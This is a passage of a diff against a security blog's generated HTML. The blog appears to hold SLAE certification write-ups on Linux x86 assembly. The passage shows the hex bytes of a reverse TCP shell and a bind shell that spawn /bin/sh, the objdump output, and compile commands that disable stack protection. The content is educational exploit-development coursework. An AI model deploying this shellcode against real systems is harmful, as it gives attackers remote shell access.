 </span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>99<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>67<span class="se">\x</span>01<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>5b<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>59<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>68<span class="se">\x</span>7f<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>10<span class="se">\x</span>92<span class="se">\x</span>66<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>6a<span class="se">\x</span>10<span class="se">\x</span>5a<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>59<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>58<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>f8<span class="se">\x</span>99<span class="se">\x</span>50<span class="se">\x</span>6a<span class="se">\x</span>0b<span class="se">\x</span>58<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>41<span class="se">\x</span>cd<span class="se">\x</span>80
+</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes reverse<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -624,13 +1041,6 @@
 </span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;//bin/sh&quot;</span>, NULL, NULL<span class="o">)</span>          <span class="o">=</span> 0
 </span></code></pre></td></tr></table></div></figure>
 
-
-<p>This blog post has been created for completing the requirements of the
-SecurityTube Linux Assembly Expert certification:</p>
-
-<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></p>
-
-<p>Student-ID: SLAE-1154</p>
 </div>
   
   
@@ -659,7 +1069,14 @@ SecurityTube Linux Assembly Expert certification:</p>
   </header>
 
 
-  <div class="entry-content"><p>In contrast with the shellcodes in shell-storm.org and exploit-db.com, this one is using the well known socket functions. According to <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a> these are also available as system calls since Linux version 4.3.</p>
+  <div class="entry-content"><pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>In contrast with the shellcodes in shell-storm.org and exploit-db.com, this one is using the well known socket functions. According to <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a> these are also available as system calls since Linux version 4.3.</p>
 
 <p>I&rsquo;ve also decided not to call <a href="http://man7.org/linux/man-pages/man2/setsockopt.2.html">setsockopt(2)</a> to reuse the port and relied on some implementation-specific behaviour to keep the shellcode smaller.</p>
 
@@ -1554,6 +1971,7 @@ SecurityTube Linux Assembly Expert certification:</p>
 <span class='line-number'>56</span>
 <span class='line-number'>57</span>
 <span class='line-number'>58</span>
+<span class='line-number'>59</span>
 </pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./configure -l 1337
 </span><span class='line'>Using remote host: 0x0101017f
 </span><span class='line'>Using listening port: 0x3905
@@ -1567,7 +1985,7 @@ SecurityTube Linux Assembly Expert certification:</p>
 </span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>0x01-bind/
 </span><span class='line'><span class="nv">$ </span>make
 </span><span class='line'>nasm  -f elf32 -o bind.o bind.asm
-</span><span class='line'>ld  -o <span class="nb">bind </span>bind.o
+</span><span class='line'>ld -N -zexecstack -o <span class="nb">bind </span>bind.o
 </span><span class='line'><span class="m">08048060</span> &lt;_start&gt;:
 </span><span class='line'> 8048060:       <span class="m">31</span> c0                   xor    eax,eax
 </span><span class='line'> 8048062:       <span class="m">31</span> f6                   xor    esi,esi
@@ -1612,6 +2030,7 @@ SecurityTube Linux Assembly Expert certification:</p>
 </span><span class='line'> 80480b0:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
 </span><span class='line'>Shellcode size: 82
 </span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>31<span class="se">\x</span>f6<span class="se">\x</span>99<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>67<span class="se">\x</span>01<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>5b<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>59<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>69<span class="se">\x</span>01<span class="se">\x</span>56<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>10<span class="se">\x</span>92<span class="se">\x</span>66<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>6a<span class="se">\x</span>10<span class="se">\x</span>5a<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6b<span class="se">\x</span>01<span class="se">\x</span>31<span class="se">\x</span>c9<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>f7<span class="se">\x</span>e1<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6c<span class="se">\x</span>01<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>41<span class="se">\x</span>41<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>58<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>f8<span class="se">\x</span>50<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>41<span class="se">\x</span>cd<span class="se">\x</span>80
+</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes <span class="nb">bind</span><span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
 </span></code></pre></td></tr></table></div></figure>
 
 
@@ -1756,13 +2175,6 @@ SecurityTube Linux Assembly Expert certification:</p>
 </span><span class='line'><span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>41<span class="se">\x</span>cd<span class="se">\x</span>80
 </span></code></pre></td></tr></table></div></figure>
 
-
-<p>This blog post has been created for completing the requirements of the
-SecurityTube Linux Assembly Expert certification:</p>
-
-<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></p>
-
-<p>Student-ID: SLAE-1154</p>
 </div>
   
   
@@ -3260,6 +3672,10 @@ to capture the flag:</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2018/06/19/slae-0x03-egghunter/">SLAE 0x03: Egghunter</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2018/05/21/slae-0x02-reverse-tcp-shell/">SLAE 0x02: Reverse TCP Shell</a>
       </li>
     
@@ -3273,10 +3689,6 @@ to capture the flag:</p>
     
       <li class="post">
         <a href="/blog/2017/11/01/vulnerable-docker-vm-easy/">Vulnerable Docker VM: Easy</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/12/29/protostar-stack/">Protostar Stack</a>
       </li>
     
   </ul>
